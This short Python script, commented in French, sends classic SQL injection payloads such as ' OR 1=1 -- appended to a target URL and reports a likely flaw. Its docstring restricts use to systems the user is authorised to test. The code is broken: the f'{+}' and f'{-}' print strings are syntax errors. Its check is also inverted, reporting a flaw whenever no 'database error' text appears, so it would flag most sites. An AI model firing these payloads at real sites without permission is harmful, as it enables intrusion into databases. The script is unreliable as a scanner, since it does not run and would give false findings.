import requests

def test_sql_injection(url):
  
  """
  Prends une URL en parametre -> url
  Prends en charger des payload d'exemple -> payloads
  
  Utiliser ce script uniquement dans un cadre légal, sur un environnement ou vous posséder les droits
  """
  
  
  # Créer une liste de chaînes de caractères dangereuses à injecter
  # Il fort conseillé d'utiliser vos payload, cette liste est un exemple
  payloads = ['\' OR 1=1 --', '\' OR 1=1 #']

  for payload in payloads:
    # Envoyer une requête GET avec l'injection SQL dans l'URL
    response = requests.get(url + payload)

    # Si la réponse ne contient pas d'erreur de base de données, cela pourrait être une faille SQL
    if 'database error' not in response.text.lower():
      print(f'{+} Une potentielle faille SQL avec, {payload}')
    else:
      print(f'{-} Aucune faille SQL avec, {payload}')

# Tester le script avec un URL
test_sql_injection('https://your_url/search?q=')
